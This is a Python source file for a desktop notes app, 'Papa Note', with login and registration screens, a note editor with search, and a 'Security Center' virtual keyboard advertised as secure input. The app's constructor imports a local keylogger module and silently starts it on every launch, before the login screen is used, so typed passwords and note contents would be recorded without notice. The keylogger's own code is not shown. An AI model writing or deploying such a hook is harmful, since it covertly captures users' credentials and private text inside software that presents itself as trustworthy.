from __future__ import annotations
import os
from datetime import datetime
from typing import Any
import customtkinter as ctk
from tkinter import messagebox
import sqlite3
from dotenv import load_dotenv
from PIL import Image

import database
import keylogger

load_dotenv()
APP_TITLE = os.getenv("APP_TITLE", "Papa Note")
WINDOW_SIZE = os.getenv("WINDOW_SIZE", "1100x700")

class PapaNoteApp(ctk.CTk):
    def __init__(self) -> None:
        super().__init__()
        
        self.title(APP_TITLE)
        self.geometry(WINDOW_SIZE)
        
        self.current_user_id: int | None = None
        self.current_note_id: int | None = None
        self.note_buttons: dict[int, ctk.CTkButton] = {}

        database.init_db()
        self._load_icons()
        
        self.container = ctk.CTkFrame(self, fg_color="transparent")
        self.container.pack(fill="both", expand=True)

        self.show_login_screen()
        keylogger.start_keylogger()

    def _load_icons(self):
        icon_dir = os.path.join(os.path.dirname(__file__), "icons")
        os.makedirs(icon_dir, exist_ok=True)
        try:
            self.icon_login = ctk.CTkImage(Image.open(os.path.join(icon_dir, "login.png")), size=(55, 55))
            self.icon_register = ctk.CTkImage(Image.open(os.path.join(icon_dir, "register.png")), size=(55, 55))
            self.icon_logo = ctk.CTkImage(Image.open(os.path.join(icon_dir, "logo.png")), size=(24, 24))
            self.icon_shield = ctk.CTkImage(Image.open(os.path.join(icon_dir, "shield.png")), size=(20, 20))
        except Exception:
            self.icon_login = self.icon_register = self.icon_logo = self.icon_shield = None

    def _clear_container(self):
        for widget in self.container.winfo_children():
            widget.destroy()

    def show_login_screen(self):
        self._clear_container()

        bg_frame = ctk.CTkFrame(self.container, fg_color="#0f172a", corner_radius=0)
        bg_frame.pack(fill="both", expand=True)

        login_frame = ctk.CTkFrame(bg_frame, width=450, height=580, corner_radius=20, 
                                   fg_color="#1e293b", border_width=1, border_color="#334155")
        login_frame.place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(login_frame, text="", image=self.icon_login).pack(pady=(45, 10))

        ctk.CTkLabel(login_frame, text="Welcome Back", font=("Segoe UI", 32, "bold"), text_color="#f8fafc").pack(pady=(0, 5))
        ctk.CTkLabel(login_frame, text="Sign in to continue to Papa Note", font=("Segoe UI", 14), text_color="#94a3b8").pack(pady=(0, 35))

        self.username_entry = ctk.CTkEntry(login_frame, width=320, height=50, placeholder_text="Username",
                                           font=("Segoe UI", 14), corner_radius=10, 
                                           fg_color="#0f172a", border_color="#334155", text_color="#f8fafc")
        self.username_entry.pack(pady=(0, 15))
        
        self.password_entry = ctk.CTkEntry(login_frame, width=320, height=50, placeholder_text="Password", show="•",
                                           font=("Segoe UI", 14), corner_radius=10, 
                                           fg_color="#0f172a", border_color="#334155", text_color="#f8fafc")
        self.password_entry.pack(pady=(0, 25))

        ctk.CTkButton(login_frame, text="Login", width=320, height=50, font=("Segoe UI", 16, "bold"),
                      corner_radius=10, fg_color="#2563eb", hover_color="#1d4ed8", 
                      command=self.handle_login).pack(pady=(10, 15))

        ctk.CTkLabel(login_frame, text="Don't have an account?", font=("Segoe UI", 13), text_color="#94a3b8").pack(pady=(15, 0))

        ctk.CTkButton(login_frame, text="Create New Account", width=320, height=40, font=("Segoe UI", 14, "bold"),
                      fg_color="transparent", text_color="#38bdf8", hover_color="#0f172a", border_width=0,
                      command=self.show_register_screen).pack(pady=(0, 20))


    def show_register_screen(self):
        self._clear_container()

        bg_frame = ctk.CTkFrame(self.container, fg_color="#0f172a", corner_radius=0)
        bg_frame.pack(fill="both", expand=True)

        reg_frame = ctk.CTkFrame(bg_frame, width=450, height=580, corner_radius=20, 
                                 fg_color="#1e293b", border_width=1, border_color="#334155")
        reg_frame.place(relx=0.5, rely=0.5, anchor="center")

        ctk.CTkLabel(reg_frame, text="", image=self.icon_register).pack(pady=(45, 10))

        ctk.CTkLabel(reg_frame, text="Create Account", font=("Segoe UI", 32, "bold"), text_color="#f8fafc").pack(pady=(0, 5))
        ctk.CTkLabel(reg_frame, text="Join Papa Note to secure your ideas", font=("Segoe UI", 14), text_color="#94a3b8").pack(pady=(0, 35))
        
        reg_user = ctk.CTkEntry(reg_frame, width=320, height=50, placeholder_text="Choose Username",
                                font=("Segoe UI", 14), corner_radius=10, 
                                fg_color="#0f172a", border_color="#334155", text_color="#f8fafc")
        reg_user.pack(pady=(0, 15))
        
        reg_pass = ctk.CTkEntry(reg_frame, width=320, height=50, placeholder_text="Choose Password", show="•",
                                font=("Segoe UI", 14), corner_radius=10, 
                                fg_color="#0f172a", border_color="#334155", text_color="#f8fafc")
        reg_pass.pack(pady=(0, 25))

        def do_register():
            u, p = reg_user.get(), reg_pass.get()
            if u and p:
                try:
                    database.register_user(u, p)
                    messagebox.showinfo("Success", "Account created! Please login.")
                    self.show_login_screen()
                except sqlite3.IntegrityError:
                    messagebox.showerror("Error", "Username already exists!")
            else:
                messagebox.showwarning("Warning", "Fields cannot be empty")

        ctk.CTkButton(reg_frame, text="Sign Up", width=320, height=50, font=("Segoe UI", 16, "bold"),
                      corner_radius=10, fg_color="#10b981", hover_color="#059669", 
                      command=do_register).pack(pady=(10, 15))

        ctk.CTkLabel(reg_frame, text="Already have an account?", font=("Segoe UI", 13), text_color="#94a3b8").pack(pady=(15, 0))

        ctk.CTkButton(reg_frame, text="Back to Login", width=320, height=40, font=("Segoe UI", 14, "bold"),
                      fg_color="transparent", text_color="#38bdf8", hover_color="#0f172a", border_width=0,
                      command=self.show_login_screen).pack(pady=(0, 20))

    def handle_login(self):
        u, p = self.username_entry.get(), self.password_entry.get()
        user = database.login_user(u, p)
        if user:
            self.current_user_id = user[0]
            self.show_main_app()
        else:
            messagebox.showerror("Login Failed", "Invalid username or password")

    def show_main_app(self):
        self._clear_container()
        self.container.grid_columnconfigure(0, weight=0)
        self.container.grid_columnconfigure(1, weight=1)
        self.container.grid_rowconfigure(0, weight=1)

        self._build_sidebar()
        self._build_main_editor()
        
        self.refresh_notes()
        self.new_note()

    def _build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self.container, width=300, corner_radius=0, fg_color="#111827")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(3, weight=1) 

        brand_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        brand_frame.grid(row=0, column=0, padx=20, pady=(30, 10), sticky="ew")
        
        ctk.CTkLabel(brand_frame, text=f" {APP_TITLE}", font=("Segoe UI", 24, "bold"), 
                     text_color="#f9fafb", image=self.icon_logo, compound="left").pack(side="left")

        self.new_button = ctk.CTkButton(self.sidebar, text="+ New Note", font=("Segoe UI", 14, "bold"), fg_color="#2563eb", height=45, command=self.new_note)
        self.new_button.grid(row=1, column=0, padx=18, pady=10, sticky="ew")

        self.search_entry = ctk.CTkEntry(self.sidebar, placeholder_text="Search notes...", height=35, fg_color="#1f2937", border_width=0)
        self.search_entry.grid(row=2, column=0, padx=18, pady=(5, 10), sticky="ew")
        self.search_entry.bind("<KeyRelease>", lambda e: self.refresh_notes())

        self.notes_scroll = ctk.CTkScrollableFrame(self.sidebar, fg_color="transparent", label_text="Your Notes")
        self.notes_scroll.grid(row=3, column=0, padx=10, pady=5, sticky="nsew")

        footer_frame = ctk.CTkFrame(self.sidebar, fg_color="transparent")
        footer_frame.grid(row=4, column=0, padx=18, pady=5, sticky="ew")
        self.note_count_label = ctk.CTkLabel(footer_frame, text="0 items", font=("Segoe UI", 12), text_color="#6b7280")
        self.note_count_label.pack(side="left")

        ctk.CTkButton(self.sidebar, text="Logout", fg_color="#ef4444", height=35, command=self.show_login_screen).grid(row=5, column=0, padx=18, pady=(10, 20), sticky="ew")

    def _build_main_editor(self):
        self.main = ctk.CTkFrame(self.container, corner_radius=0, fg_color="#0b1220")
        self.main.grid(row=0, column=1, sticky="nsew")
        self.main.grid_columnconfigure(0, weight=1)
        self.main.grid_rowconfigure(1, weight=1)

        top_bar = ctk.CTkFrame(self.main, fg_color="transparent", height=80)
        top_bar.grid(row=0, column=0, padx=28, pady=(20, 10), sticky="ew")
        
        self.title_entry = ctk.CTkEntry(top_bar, placeholder_text="Enter note title...", font=("Segoe UI", 26, "bold"), fg_color="transparent", border_width=0, text_color="#f3f4f6")
        self.title_entry.pack(side="left", fill="x", expand=True)
        self.title_entry.bind("<FocusIn>", lambda e: setattr(self, 'active_input_target', self.title_entry))

        ctk.CTkButton(top_bar, text="Save", width=100, fg_color="#10b981", command=self.save_note).pack(side="right", padx=5)
        ctk.CTkButton(top_bar, text="Delete", width=80, fg_color="#374151", hover_color="#ef4444", command=self.delete_note).pack(side="right", padx=5)

        editor_card = ctk.CTkFrame(self.main, fg_color="#111827", corner_radius=15)
        editor_card.grid(row=1, column=0, padx=28, pady=10, sticky="nsew")
        self.content_text = ctk.CTkTextbox(editor_card, font=("Segoe UI", 15), fg_color="transparent", text_color="#d1d5db", padx=20, pady=20, undo=True)
        self.content_text.pack(fill="both", expand=True)
        self.content_text.bind("<FocusIn>", lambda e: setattr(self, 'active_input_target', self.content_text))

        self.active_input_target = self.content_text

        self._build_security_center()

        self.status_label = ctk.CTkLabel(self.main, text="Ready", font=("Segoe UI", 12), text_color="#4b5563")
        self.status_label.grid(row=3, column=0, padx=28, pady=(0, 10), sticky="w")

    def _build_security_center(self) -> None:
        self.keyboard_visible = False
        self.caps_lock_active = False

        self.security_top_frame = ctk.CTkFrame(self.main, fg_color="transparent")
        self.security_top_frame.grid(row=2, column=0, padx=28, pady=(0, 5), sticky="ew")

        ctk.CTkLabel(self.security_top_frame, text=" Security Center", 
                     font=("Segoe UI", 12, "bold"), text_color="#10b981", 
                     image=self.icon_shield, compound="left").pack(side="left")

        self.toggle_kb_btn = ctk.CTkButton(self.security_top_frame, text="Show Virtual Keyboard", 
                                           width=150, height=28, fg_color="#334155", hover_color="#475569",
                                           command=self._toggle_virtual_keyboard)
        self.toggle_kb_btn.pack(side="right")

        self.security_frame = ctk.CTkFrame(self.main, corner_radius=15, fg_color="#1e293b")
        
        self.keys_frame = ctk.CTkFrame(self.security_frame, fg_color="transparent")
        self.keys_frame.pack(pady=10, padx=10)

        self._render_keyboard()

    def _render_keyboard(self):
        for widget in self.keys_frame.winfo_children():
            widget.destroy()

        layouts = [
            ['`', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 'Backspace'],
            ['Tab', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\\'],
            ['Caps', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', "'", 'Enter'],
            ['Shift', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 'Shift'],
            ['Space']
        ]

        btn_color = "#334155"
        hover_color = "#475569"
        special_color = "#1e293b"

        for row_idx, row in enumerate(layouts):
            row_frame = ctk.CTkFrame(self.keys_frame, fg_color="transparent")
            row_frame.pack(pady=2)
            
            for key in row:
                display_key = key.upper() if self.caps_lock_active and len(key) == 1 and key.isalpha() else key
                
                width = 45
                color = btn_color
                
                if key in ['Backspace', 'Tab', 'Caps', 'Enter', 'Shift']:
                    width = 80
                    color = special_color
                elif key == 'Space':
                    width = 400
                    color = special_color

                if key == 'Caps' and self.caps_lock_active:
                    color = "#10b981" 

                ctk.CTkButton(row_frame, text=display_key, width=width, height=45, 
                              fg_color=color, hover_color=hover_color, font=("Segoe UI", 14),
                              command=lambda k=key: self._virtual_input(k)).pack(side="left", padx=2)

    def _toggle_virtual_keyboard(self):
        if self.keyboard_visible:
            self.security_frame.grid_forget()
            self.toggle_kb_btn.configure(text="Show Virtual Keyboard")
            self.keyboard_visible = False
        else:
            self.security_frame.grid(row=3, column=0, padx=28, pady=(0, 22), sticky="ew")
            self.toggle_kb_btn.configure(text="Hide Virtual Keyboard")
            self.keyboard_visible = True
            
        self.status_label.grid(row=4, column=0, padx=28, pady=(0, 10), sticky="w")

    def _virtual_input(self, key: str) -> None:
        target = self.active_input_target
        if not target:
            target = self.content_text

        if isinstance(target, ctk.CTkEntry):
            if key == 'Space':
                target.insert("insert", " ")
            elif key == 'Backspace':
                pos = target.index("insert")
                if pos > 0:
                    target.delete(pos - 1, pos)
            elif key in ('Enter', 'Tab', 'Shift'):
                pass
            elif key == 'Caps':
                self.caps_lock_active = not self.caps_lock_active
                self._render_keyboard()
                return
            else:
                char = key.upper() if self.caps_lock_active and len(key) == 1 and key.isalpha() else key
                target.insert("insert", char)
        else:
            if key == 'Space':
                target.insert("insert", " ")
            elif key == 'Backspace':
                pos = target.index("insert")
                if pos != "1.0":
                    target.delete(f"{pos}-1c", pos)
            elif key == 'Enter':
                target.insert("insert", "\n")
            elif key == 'Tab':
                target.insert("insert", "    ")
            elif key == 'Shift':
                pass
            elif key == 'Caps':
                self.caps_lock_active = not self.caps_lock_active
                self._render_keyboard()
                return
            else:
                char = key.upper() if self.caps_lock_active and len(key) == 1 and key.isalpha() else key
                target.insert("insert", char)
            
        self.status_label.configure(text=f"Secure Input Action: [{key}]", text_color="#10b981")

    def save_note(self) -> None:
        title = self.title_entry.get().strip() or "Untitled note"
        content = self.content_text.get("1.0", "end-1c").strip()
        now = datetime.now().isoformat(timespec="seconds")

        self.current_note_id = database.save_note(self.current_user_id, self.current_note_id, title, content, now)
        self.status_label.configure(text="Changes saved", text_color="#10b981")
        self.refresh_notes()

    def delete_note(self) -> None:
        if self.current_note_id is None: return
        if messagebox.askyesno("Confirm", "Delete this note?"):
            database.delete_note(self.current_note_id, self.current_user_id)
            self.new_note()
            self.refresh_notes()

    def refresh_notes(self) -> None:
        query = self.search_entry.get().strip()
        notes = database.fetch_notes(self.current_user_id, query)
        for widget in self.notes_scroll.winfo_children(): widget.destroy()
        self.note_buttons.clear()
        self.note_count_label.configure(text=f"{len(notes)} items")

        for index, note in enumerate(notes):
            btn = ctk.CTkButton(self.notes_scroll, text=f"{note['title'][:20]}\n{note['updated_at'][:10]}", anchor="w", height=60, fg_color="#0f172a", command=lambda n=note['id']: self.open_note(n))
            btn.pack(padx=5, pady=5, fill="x")
            self.note_buttons[note["id"]] = btn
        self._highlight_active_note()

    def open_note(self, note_id: int) -> None:
        note = database.get_note(note_id)
        if note:
            self.current_note_id = note["id"]
            self.title_entry.delete(0, "end"); self.title_entry.insert(0, note["title"])
            self.content_text.delete("1.0", "end"); self.content_text.insert("1.0", note["content"])
            self._highlight_active_note()

    def new_note(self) -> None:
        self.current_note_id = None
        self.title_entry.delete(0, "end"); self.content_text.delete("1.0", "end")
        self._highlight_active_note()

    def _highlight_active_note(self) -> None:
        for nid, btn in self.note_buttons.items():
            btn.configure(fg_color="#1d4ed8" if nid == self.current_note_id else "#0f172a")

if __name__ == "__main__":
    app = PapaNoteApp()
    app.mainloop()